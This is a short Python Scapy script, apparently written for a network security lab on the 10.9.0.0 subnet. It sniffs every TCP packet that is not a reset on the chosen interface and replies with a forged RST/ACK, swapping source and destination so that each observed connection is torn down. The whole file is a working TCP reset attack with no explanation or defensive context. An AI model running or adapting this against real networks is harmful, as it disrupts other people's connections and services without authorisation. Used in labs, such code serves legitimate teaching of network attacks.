#!/usr/bin/env python3
from scapy.all import *
import subprocess

def spoof_reply(pkt):
    ip = IP(src=pkt.getlayer(IP).dst, dst=pkt.getlayer(IP).src)
    tcp = TCP(sport=pkt.getlayer(TCP).dport, dport=pkt.getlayer(TCP).sport, flags="RA", seq=pkt.getlayer(TCP).ack + 1, ack=pkt.getlayer(TCP).seq + 1)
    pkt = ip/tcp
    ls(pkt)
    send(pkt,verbose=0)

cmd = "ip a | grep 10.9.0.1 | awk '{print $7}'"
IFACE = subprocess.run(cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE).stdout.strip()
pkt = sniff(iface=IFACE, filter='tcp[tcpflags] & tcp-rst = 0', prn=spoof_reply)